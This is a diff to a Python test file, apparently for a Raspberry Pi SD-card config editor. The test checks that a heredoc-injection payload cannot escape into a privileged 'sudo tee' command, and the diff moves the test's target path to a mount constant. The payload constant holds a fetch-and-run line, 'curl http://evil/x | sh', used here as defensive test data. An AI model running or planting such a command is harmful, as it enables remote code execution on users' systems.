@@ -167,16 +167,17 @@ _PAYLOAD = "NM_SD_EOF\ncurl http://evil/x | sh\n"
 
 def test_tee_does_not_let_card_content_escape_into_shell():
     from tests.teeutil import decode_tee
-    cmd = sd_edit._tee("/tmp/nm_sd_boot/config.txt", f"dtparam=audio=on\n{_PAYLOAD}")
+    target = f"{sd_edit.SD_MOUNT}/config.txt"          # /run/nodemedic/sd_boot/...
+    cmd = sd_edit._tee(target, f"dtparam=audio=on\n{_PAYLOAD}")
     # The payload must not appear as shell text anywhere in the command...
     assert "curl http://evil/x" not in cmd
     assert "NM_SD_EOF" not in cmd
     # ...and there must be exactly one privileged target, still a plain tee.
     assert cmd.count("sudo -n") == 1
-    assert "sudo -n tee /tmp/nm_sd_boot/config.txt" in cmd
+    assert f"sudo -n tee {target}" in cmd
     # ...while the content still round-trips byte-for-byte.
     path, content = decode_tee(cmd)
-    assert path == "/tmp/nm_sd_boot/config.txt"
+    assert path == target == "/run/nodemedic/sd_boot/config.txt"
     assert content == f"dtparam=audio=on\n{_PAYLOAD}"
 
 
